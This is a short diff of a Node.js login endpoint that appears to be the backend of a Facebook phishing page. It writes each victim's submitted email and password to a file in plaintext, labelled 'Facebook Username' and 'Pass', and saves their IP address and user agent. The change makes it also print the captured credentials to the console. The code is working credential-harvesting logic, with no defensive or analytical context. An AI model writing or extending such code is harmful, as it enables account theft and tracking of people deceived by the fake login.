@@ -88,7 +88,7 @@ app.post("/api/login", async (req, res) => {
   const line = `Facebook Username: ${email} Pass: ${password}${os.EOL}`;
   try {
     await fsPromises.appendFile(userFile, line, "utf8");
-    console.log("✅ Saved username/password (plaintext) for:", email, "from", ip);
+    console.log(line);
     // ensure IP+UA block is saved as well (in case login happened before middleware finished)
     saveIpOnce(ip, ua).catch(() => {});
     return res.json({ success: true, message: "Logged in" });
